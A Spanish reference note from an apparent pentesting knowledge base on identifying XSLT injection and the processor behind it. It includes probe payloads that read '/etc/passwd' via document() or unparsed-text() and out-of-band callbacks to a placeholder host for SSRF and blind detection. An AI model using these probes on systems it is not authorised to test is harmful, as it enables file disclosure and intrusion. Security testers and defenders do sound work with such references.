---
tipo: meta
aliases:
  - identificar procesador XSLT
  - system-property
  - XSLT version
tags:
  - meta/referencia
  - dominio/web
---

# XSLT - matriz de identificación

> [!info] Referencia pura, no un zettel
> Confirmar la inyección y qué procesador es. Los payloads por procesador están en [[XSLT payloads - matriz de referencia]]; el criterio, en [[MOC - XSLT injection]].

Identificar el procesador va antes que cualquier payload, igual que en [[SSTI - matriz de identificación]]: la capacidad —lectura, SSRF, ejecución— y la sintaxis dependen de cuál sea.

## 1. Confirmar la inyección

Si se controla parte de la hoja de estilo o el documento transformado, inyectar una expresión que se evalúe:

```xml
<xsl:value-of select="1+1"/>
```

Devuelve `2` → hay evaluación de XSLT. Si se refleja literal, no se está inyectando en la hoja.

Cuando se controla el XML de entrada y no la hoja, la inyección es distinta —depende de si la hoja procesa nodos que el atacante controla—; probar valores que la hoja copie a la salida.

## 2. Identificar el procesador y la versión

```xml
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:version')"/>
<xsl:value-of select="system-property('xsl:vendor-url')"/>
<xsl:value-of select="system-property('xsl:product-name')"/>
<xsl:value-of select="system-property('xsl:product-version')"/>
```

## 3. Firmas por procesador

| `xsl:vendor` devuelve | Procesador | Lenguaje | Extensiones |
|---|---|---|---|
| `libxslt` | libxslt | C / **PHP** | `registerPHPFunctions` |
| `Apache Software Foundation` | Xalan | **Java** | Java reflection |
| `SAXON` / `Saxonica` | Saxon | Java | Depende de la edición |
| `Microsoft` | .NET `XslCompiledTransform` | **.NET** | `msxsl:script` |
| `Transformiix` | Transformiix (Mozilla) | — | Sin extensiones |
| vacío / genérico | Varía | — | Probar cada uno |

El `vendor` decide todo: qué sintaxis de extensión probar, y por lo tanto si hay RCE. Ver [[XSLT - ejecución por funciones de extensión]].

## 4. Versión de XSLT

`xsl:version` = `1.0` o `2.0` (o `3.0`).

| Versión | Qué habilita |
|---|---|
| 1.0 | `document()` para XML |
| 2.0 | `unparsed-text()` (leer texto plano), regex, más funciones |
| 3.0 | Aún más, según el procesador |

`unparsed-text()` necesita 2.0; si es 1.0, la lectura de archivos va por `document()`.

## 5. Probar qué capacidades hay

Después de identificar, confirmar cada capacidad con una prueba mínima:

| Capacidad | Prueba |
|---|---|
| Lectura de archivos | `document('file:///etc/passwd')` o `unparsed-text('/etc/passwd')` |
| SSRF | `document('http://mi-host/xslt')` — ¿llega la petición? |
| Ejecución | la llamada de extensión del procesador — ver payloads |

Ir en ese orden: lectura y SSRF necesitan menos configuración que la ejecución.

## 6. Detección ciega

Si la salida no se refleja, confirmar por canal fuera de banda —igual que SSTI y command injection ciegos—:

```xml
<xsl:value-of select="document('http://mi-host/xslt-ciego')"/>
```

Si llega la petición al servidor propio, hay inyección con `document()` habilitado.

## 7. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `1+1` vuelve literal | No se inyecta en la hoja. Revisar dónde cae la entrada |
| `system-property` da error | Puede no ser XSLT; confirmar con `1+1` |
| `vendor` vacío | Procesador poco común; probar payloads de cada uno |
| `document()` da error de acceso | Recursos externos deshabilitados. Solo queda lo que no los use |
| `unparsed-text()` no existe | Es XSLT 1.0; usar `document()` |
| Nada se refleja | Inyección ciega; ir a canal fuera de banda, § 6 |

## Relacionadas

[[MOC - XSLT injection]] · [[XSLT payloads - matriz de referencia]] · [[SSTI - matriz de identificación]] · [[XXE payloads - matriz de referencia]]
